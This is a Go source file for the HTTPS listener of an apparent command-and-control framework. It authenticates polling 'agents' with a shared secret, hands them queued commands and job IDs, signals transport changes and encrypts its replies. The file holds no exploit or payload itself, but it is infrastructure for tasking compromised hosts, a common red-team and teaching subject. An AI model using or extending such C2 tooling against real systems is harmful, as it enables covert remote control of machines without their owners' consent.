package server

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"time"

	"github.com/go-chi/chi/v5"

	"c2framework/internals/config"
	"c2framework/internals/control"
	"c2framework/internals/crypto"
)

// HTTPSServer implements the Server interface for HTTPS
type HTTPSServer struct {
	addr    string
	server  *http.Server
	tlsCert string
	tlsKey       string
	sharedSecret string
}

// HTTPSResponse represents the JSON response for HTTPS
type HTTPSResponse struct {
	Change    bool            `json:"change"`
	Job       bool            `json:"job"`
	JobID     string          `json:"job_id,omitempty"`
	Command   string          `json:"command,omitempty"`
	Arguments json.RawMessage `json:"data,omitempty"`
}

// NewHTTPSServer creates a new HTTPS server
func NewHTTPSServer(cfg *config.ServerConfig) *HTTPSServer {
	return &HTTPSServer{
		addr:    fmt.Sprintf("%s:%s", cfg.ListeningInterface, cfg.ListeningPort),
		tlsCert: cfg.TlsCert,
		tlsKey:       cfg.TlsKey,
		sharedSecret: cfg.SharedSecret,
	}
}

// Start implements Server.Start for HTTPS
func (s *HTTPSServer) Start() error {
	// Create Chi router
	r := chi.NewRouter()

	// Apply authentication middleware to agent routes
	r.With(AuthMiddleware(s.sharedSecret)).Get("/", RootHandler(s.sharedSecret))

	// Create the HTTP server
	s.server = &http.Server{
		Addr:    s.addr,
		Handler: r,
	}

	// Start the server
	return s.server.ListenAndServeTLS(s.tlsCert, s.tlsKey)
}

// Stop implements Server.Stop for HTTPS
func (s *HTTPSServer) Stop() error {
	// If there's no server, nothing to stop
	if s.server == nil {
		return nil
	}

	// Give the server 5 seconds to shut down gracefully
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	return s.server.Shutdown(ctx)
}

// RootHandler returns a handler that encrypts responses
func RootHandler(secret string) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		log.Printf("Endpoint %s has been hit by agent\n", r.URL.Path)

		var response HTTPSResponse

		// FIRST, check if there are pending commands
		cmd, exists := control.AgentCommands.GetCommand()
		if exists {
			log.Printf("Sending command to agent: %s\n", cmd.Command)
			response.Job = true
			response.Command = cmd.Command
			response.Arguments = cmd.Arguments
			response.JobID = fmt.Sprintf("job_%06d", rand.Intn(1000000))
			log.Printf("Job ID: %s\n", response.JobID)
		} else {
			log.Printf("No commands in queue")
		}

		// THEN, check if we should transition
		shouldChange := control.Manager.CheckAndReset()

		if shouldChange {
			response.Change = true
			log.Printf("HTTPS: Sending transition signal (change=true)")
		} else {
			log.Printf("HTTPS: Normal response (change=false)")
		}

		// Marshal response to JSON
		responseJSON, err := json.Marshal(response)
		if err != nil {
			log.Printf("Error marshaling response: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Encrypt the response
		encryptedResponse, err := crypto.Encrypt(responseJSON, secret)
		if err != nil {
			log.Printf("Error encrypting response: %v\n", err)
			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
			return
		}

		// Set content type to octet-stream for encrypted data
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write([]byte(encryptedResponse))
	}
}
